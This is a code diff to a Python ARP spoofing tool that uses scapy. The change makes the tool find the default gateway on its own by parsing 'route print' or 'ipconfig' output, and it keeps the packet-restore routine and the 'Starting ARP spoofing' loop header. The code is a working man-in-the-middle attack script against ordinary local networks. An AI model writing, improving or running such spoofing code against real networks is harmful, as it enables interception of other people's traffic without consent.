@@ -1,10 +1,8 @@
 import scapy.all as scapy
+import subprocess
 import time
 import sys
-
-interval = 4
-ip_target = input("Enter target IP address: ")
-ip_gateway = input("Enter gateway IP address: ")
+import re
 
 
 def get_mac(ip):
@@ -36,6 +34,32 @@ def restore(destination_ip, source_ip):
 	packet = ether/arp
 	scapy.sendp(packet, count=5, verbose=False)
 
+
+def get_default_gateway():
+
+    try:
+        out = subprocess.check_output(["route", "print"], text=True, errors="ignore")
+        m = re.search(r'^\s*0\.0\.0\.0\s+0\.0\.0\.0\s+(\d+\.\d+\.\d+\.\d+)\s+', out, re.MULTILINE)
+        if m:
+            return m.group(1)
+    except Exception:
+        pass
+
+    try:
+        out = subprocess.check_output(["ipconfig"], text=True, errors="ignore")
+
+        matches = re.findall(r'Default Gateway[ .:]*([\d\.]+)', out)
+        for g in matches:
+            if g and not g.startswith('0.0.0.0'):
+                return g
+    except Exception:
+        pass
+    return None
+
+
+interval = 4
+ip_target = input("Enter target IP address: ")
+ip_gateway = get_default_gateway()
 
 try:
 	print(f"Starting ARP spoofing: {ip_target} <-> {ip_gateway} (interval={interval}s)")
